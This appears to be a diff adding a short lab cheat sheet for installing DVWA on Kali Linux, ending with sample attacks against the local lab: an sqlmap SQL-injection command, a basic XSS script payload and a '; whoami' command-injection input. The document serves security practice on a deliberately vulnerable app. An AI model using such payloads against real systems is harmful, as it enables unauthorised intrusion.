@@ -1,0 +1,40 @@
+DVWA Setup Commands (Kali Linux)
+System Update
+sudo apt update && sudo apt upgrade -y
+Install Required Packages
+sudo apt install apache2 mysql-server php php-mysqli php-gd php-curl git -y
+Start Services
+bash
+sudo systemctl start apache2
+sudo systemctl start mysql
+sudo systemctl enable apache2
+sudo systemctl enable mysql
+Download DVWA
+
+git clone https://github.com/digininja/DVWA.git /var/www/html/DVWA
+Set Permissions
+bash
+sudo chown -R www-data:www-data /var/www/html/DVWA/
+sudo chmod -R 755 /var/www/html/DVWA/
+Configure DVWA
+nano /var/www/html/DVWA/config/config.inc.php
+MySQL Setup
+sudo mysql -u root -p
+CREATE DATABASE dvwa;
+EXIT;
+Restart Services
+
+sudo systemctl restart apache2
+sudo systemctl restart mysql
+Exploitation Commands**
+SQL Injection (SQLmap)
+
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxx; security=low" --dbs
+ XSS Payload
+html
+<script>alert('Hacked')</script>
+Command Injection Payload
+
+; whoami
+Screenshot Commands
+flameshot gui
